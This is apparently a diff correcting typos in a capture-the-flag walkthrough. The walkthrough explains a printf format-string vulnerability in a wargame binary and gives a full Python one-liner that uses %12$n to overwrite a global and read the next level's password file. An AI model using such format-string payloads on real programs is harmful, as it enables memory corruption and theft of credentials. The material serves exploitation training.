@@ -9,11 +9,11 @@ by doing "info variables" in gdb we know that there is a global named "m" locate
 main call function n
 
 it reads a string from input and call p
-p is printing the string with printf but it use teh input as format string 
+p is printing the string with printf but it use the input as format string 
 
 then function n check if address 0x08049810  == 0x1025544 to call system("/bin/cat /home/user/level5/.pass")
 
-so we will use printf to exploit the programm ands set the adress to the right value
+so we will use printf to exploit the programm and set the adress to the right value
 
 first we find the offset
 
@@ -22,7 +22,7 @@ AAAAb7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37
 
 41414141 is in 12th position so the offset is 12th
 
-so we exploi with 
+so we exploit with 
 
 python -c 'print("\x08\x04\x98\x10"[::-1]+"%16930112d"+"%12$n")' | ./level4 | tr -d " "
 
